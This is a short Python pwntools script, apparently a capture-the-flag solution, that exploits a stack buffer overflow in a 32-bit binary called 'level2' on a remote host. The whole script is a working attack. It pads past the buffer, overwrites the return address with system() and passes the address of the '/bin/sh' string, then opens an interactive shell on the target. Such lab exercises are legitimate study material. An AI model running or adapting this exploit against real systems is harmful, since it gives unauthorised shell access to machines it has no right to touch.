from pwn import *

#n = process('./level2')
n = remote('111.198.29.45', 30870)

elf = ELF('./level2')

offset = 0x88 + 4

sh_addr = next(elf.search('/bin/sh'))
sys_addr = elf.symbols["system"]

payload = 'a' * offset + p32(sys_addr) + p32(1) + p32(sh_addr)
n.recv()
n.sendline(payload)
n.interactive()
